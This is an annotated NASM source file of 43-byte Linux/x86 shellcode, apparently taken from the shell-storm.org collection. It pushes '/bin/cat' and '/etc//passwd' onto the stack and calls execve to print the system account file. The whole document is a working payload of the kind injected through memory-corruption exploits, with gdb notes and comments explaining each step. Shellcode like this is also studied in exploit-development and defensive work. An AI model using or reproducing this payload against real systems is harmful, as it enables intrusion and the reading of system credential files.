;Original Source Code URL : http://shell-storm.org/shellcode/files/shellcode-571.php
;Linux/x86 - bin/cat /etc/passwd - 43 bytes by fb1h2s

; original nasm file 
;/x $ebx = 0xbffff640
;/x $ecx = 0xbffff630
;(gdb) x/s 0xbffff630
;0xbffff630:     "/etc//passwd"
;(gdb) x/s 0xbffff640
;0xbffff640:     "/bin/cat"


global _start			

section .text

_start:

xor    eax,eax
cdq
push   edx
push   0x7461632f 
push   0x6e69622f  ;push "/bin/cat" to stack i.e.   esp
mov    ebx,esp     ;ebx have value of "/bin/cat"
push   edx
push   0x64777373
push   0x61702f2f
push   0x6374652f ;push "/etc//passwd" to stack i.e. esp
mov    ecx,esp    ;ecx have value of "/etc//passwd" 
mov    al,0xb   ;define __NR_execve 11 (cat /usr/include/i386-linux-gnu/asm/unistd_32.h)
push   edx
push   ecx
push   ebx
mov    ecx,esp
int    0x80   
